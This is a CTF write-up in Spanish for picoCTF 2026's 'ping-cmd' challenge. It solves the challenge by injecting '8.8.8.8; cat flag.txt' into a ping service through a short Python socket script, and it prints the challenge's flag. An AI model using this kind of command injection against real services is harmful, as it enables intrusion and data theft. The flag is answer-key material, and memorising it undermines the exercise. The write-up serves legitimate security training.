# General Skills — ping-cmd

## Descripción
> **Prompt oficial:** "Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input? You can connect to the service here `nc <host> <puerto>`"

- **Categoría:** General Skills
- **Dificultad:** Easy
- **Evento/origen:** picoCTF 2026
- **Autor:** Yahaya Meddy

## Solución
Clásico **command injection**: el servicio pide una IP, dice que "solo permite 8.8.8.8", pero en el backend probablemente hace algo como `os.system("ping -c 2 " + input)` sin sanitizar. Basta con anteponer la IP permitida y encadenar un comando adicional con `;`.

```bash
python3 - <<'EOF'
import socket, time
s = socket.create_connection(("<host>", <puerto>), timeout=8)
print(s.recv(65536).decode())
s.sendall(b"8.8.8.8; cat flag.txt\n")
time.sleep(6)
print(s.recv(65536).decode())
EOF
```

La salida incluye primero el `ping` normal a 8.8.8.8 y, a continuación, el contenido de `flag.txt`.

Flag: `picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_17ae04f2}`

## Notas adicionales
- Al conectar con `nc` hay que **esperar** a que el `ping` termine (2 paquetes, ~1s) antes de que aparezca la salida del comando inyectado — un timeout de lectura demasiado corto puede hacer creer que la inyección no funcionó.
- Se resolvió directamente desde la terminal local con un socket Python (más rápido y fiable que usar el webshell embebido del navegador para este tipo de interacción por `nc`).

## Referencias
- Reto: https://learn.cylabacademy.org/library/757
